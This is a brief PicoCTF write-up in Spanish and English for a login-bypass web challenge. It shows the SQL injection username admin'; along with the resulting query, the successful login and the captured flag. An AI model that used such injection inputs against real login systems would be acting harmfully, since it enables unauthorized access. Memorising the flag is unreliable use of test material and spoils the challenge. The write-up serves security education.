# Retos PicoCTF


## Objetivo 

There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Solución 

```
Se ingresa admin'; asi en la sentencia sql se ignora todo despues de admin.
username: admin';
password: 
SQL query: SELECT * FROM users WHERE name='admin';' AND password=''
Logged in!
Your flag is: picoCTF{m0R3_SQL_plz_aee925db}

```

## Notas adicionales 
The password is being filtered.
## Referencias 
